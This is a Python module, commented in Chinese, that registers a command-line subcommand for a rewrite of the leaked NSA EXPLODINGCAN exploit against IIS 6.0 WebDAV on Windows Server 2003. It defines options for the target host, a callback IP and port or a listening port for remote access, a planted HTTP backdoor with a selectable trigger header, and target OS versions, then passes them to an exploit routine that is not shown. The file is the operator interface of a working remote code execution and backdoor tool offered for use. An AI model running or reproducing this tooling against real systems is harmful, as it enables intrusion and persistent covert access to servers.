"""exploding-can — MS03-007 (EXPLODINGCAN / EXCA) IIS WebDAV 远程利用。

Python 重写的 NSA Explodingcan 利用工具 `Explodingcan-2.0.2.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 IIS WebDAV 缓冲区溢出利用流程。
"""

from . import exploding_can


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def exploding_can_handle(args):
    """Run the EXPLODINGCAN exploitation sequence against the supplied host."""
    return exploding_can.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        enable_ssl=args.enable_ssl,
        iis_path_size=args.iis_path_size,
        host_string=args.host_string,
        auth_type=args.auth_type,
        username=args.username,
        password=args.password,
        payload_access_type=args.payload_access_type,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        listen_local_port=args.listen_local_port,
        callin_timeout=args.callin_timeout,
        backdoor=args.backdoor,
        backdoor_header=args.backdoor_header,
        backdoor_value_source=args.backdoor_value_source,
        backdoor_value=args.backdoor_value,
        backdoor_delay=args.backdoor_delay,
        backdoor_retries=args.backdoor_retries,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `exploding-can` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "exploding-can",
        help="MS03-007 (EXPLODINGCAN) IIS WebDAV 远程利用",
        description="Python 重写的 NSA Explodingcan (EXCA / MS03-007) 利用工具 "
                    "Explodingcan-2.0.2。针对 Microsoft IIS 6.0 WebDAV，"
                    "通过构造溢出缓冲区与 ROP 链执行任意代码，并可选投递后门。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=80,
        help="目标 HTTP 端口（默认 80，HTTPS 为 443）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="网络超时秒（默认 60）",
    )
    p.add_argument(
        "--enable-ssl", action="store_true",
        help="为 HTTPS 目标启用 SSL",
    )
    p.add_argument(
        "--iis-path-size", type=int, default=18,
        help="IIS 路径长度（3–68，默认 18）",
    )
    p.add_argument(
        "--host-string", metavar="STR", default="localhost",
        help="HTTP 请求中使用的 Host 字符串（默认 localhost）",
    )
    p.add_argument(
        "--auth-type",
        choices=["None", "Basic"],
        default="None",
        help="认证类型（默认 None）",
    )
    p.add_argument(
        "--username", metavar="USER",
        help="Basic 认证用户名",
    )
    p.add_argument(
        "--password", metavar="PASS",
        help="Basic 认证密码",
    )
    p.add_argument(
        "--payload-access-type",
        choices=["Callback", "Listen", "Backdoor"],
        default="Callback",
        help="载荷访问类型（默认 Callback）",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Listen 模式：目标监听端口",
    )
    p.add_argument(
        "--listen-local-port", type=int, metavar="PORT",
        help="Listen 模式：本地监听端口",
    )
    p.add_argument(
        "--callin-timeout", type=int, default=10,
        help="Listen 模式：callin 前休眠秒（默认 10）",
    )
    p.add_argument(
        "--backdoor",
        action="store_true",
        help="Backdoor 模式：在目标开启 HTTP 后门",
    )
    p.add_argument(
        "--backdoor-header",
        choices=[
            "Accept","Accept-Charset","Accept-Encoding","Accept-Language",
            "Allow","Authorization","Cache-Control","Content-Encoding",
            "Content-Language","Content-Location","Content-MD5","Content-Range",
            "Content-Type","Cookie","Date","Expect","Expires","From",
            "If-Match","If-Modified-Since","If-None-Match","If-Range",
            "If-Unmodified-Since","Last-Modified","Max-Forwards","Pragma",
            "Proxy-Authorization","Range","Referer","Trailer","Translate",
            "Upgrade","User-Agent","Via","Warning",
        ],
        default="If-Match",
        help="Backdoor 模式：触发后门的 HTTP 头部名（默认 If-Match）",
    )
    p.add_argument(
        "--backdoor-value-source",
        choices=["Manual", "RandomEtag", "RandomBasicAuth"],
        default="RandomEtag",
        help="Backdoor 模式：头部值生成方式（默认 RandomEtag）",
    )
    p.add_argument(
        "--backdoor-value", metavar="VALUE",
        help="Backdoor 模式：Manual 时的手动头部值",
    )
    p.add_argument(
        "--backdoor-delay", type=int, default=10,
        help="Backdoor 模式：等待触发响应的秒数（默认 10）",
    )
    p.add_argument(
        "--backdoor-retries", type=int, default=1,
        help="Backdoor 模式：触发重试次数（默认 1）",
    )
    p.add_argument(
        "--target-os",
        choices=[
            "W2K3SP0", "W2K3SP1", "W2K3SP2",
            "W2K3SP0_v5IM", "W2K3SP1_v5IM",
        ],
        default="W2K3SP2",
        help="目标操作系统（默认 W2K3SP2）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=exploding_can_handle)
